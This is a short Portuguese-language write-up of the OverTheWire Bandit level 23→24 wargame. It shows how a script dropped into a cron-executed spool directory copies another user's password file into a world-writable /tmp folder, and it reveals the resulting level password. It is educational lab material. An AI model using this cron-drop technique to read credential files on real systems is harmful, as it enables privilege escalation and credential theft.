# Bandit level 23 → 24

## Objetivo
Temos que ir até a pasta /etc/cron.d/ e investigar o script instaurado nela para
achar uma forma de conseguir a senha.

## Solução
Lendo o script, descobrimos que devo criar um script próprio para que o cron
o leia e nos dê a senha.

# Comandos usados
```bash
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/meu_hack
chmod 777 /tmp/meu_hack
cd /tmp/meu_hack
nano pegar_senha.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/meu_hack/senha.txt
chmod 777 pegar_senha.sh
cp /tmp/meu_hack/pegar_senha.sh /var/spool/bandit24/foo/
ls -la
cat senha.txt
```
## Aprendizado

# Como criar um script com bash
Após inserir o shebang e jogar o script na mesma pasta do cron
descobrimos que o cron, se tiver as permissões necessárias,
vai ler e rodar o nosso script.

## Conclusão
Após um tempo de aproximadamente 60 segundos, recebemos um arquivo
com o nome de senha.txt. Lendo esse arquivo temos a senha para o próximo passo.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8.
